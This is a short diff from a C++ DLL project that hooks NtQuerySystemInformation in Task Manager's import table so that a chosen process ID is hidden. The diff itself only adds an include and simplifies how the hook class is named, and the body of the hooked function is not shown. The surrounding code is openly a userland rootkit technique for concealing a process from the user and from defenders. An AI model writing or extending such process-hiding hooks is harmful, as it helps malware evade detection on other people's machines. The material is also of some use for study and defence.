@@ -2,12 +2,13 @@
 #include "stdafx.h"
 #include "Process.hpp" 
 #include "IATHooking.hpp"
+#include "File.hpp"
 
 constexpr char* TASK_MGR_EXE = "Taskmgr.exe";
 constexpr char* HIDDEN_PID_NAME = "hidden_pid";
 constexpr char* HOOK_FUNCTION = "NtQuerySystemInformation";
 
-static IATHooking::IATHooking* g_NtQuerySystemInformation_hook;
+static IATHooking* g_NtQuerySystemInformation_hook;
 static int g_hidden_pid;
 typedef NTSTATUS(*pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
 
@@ -46,7 +47,6 @@ NTSTATUS __stdcall HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS Syste
 	return status;
 }
 
-
 BOOL APIENTRY DllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved
@@ -60,7 +60,7 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 
 		if (g_hidden_pid)
 		{
-			g_NtQuerySystemInformation_hook = new IATHooking::IATHooking(TASK_MGR_EXE, HOOK_FUNCTION, &HookedNtQuerySystemInformation);
+			g_NtQuerySystemInformation_hook = new IATHooking(TASK_MGR_EXE, HOOK_FUNCTION, &HookedNtQuerySystemInformation);
 		}
 
 		break;
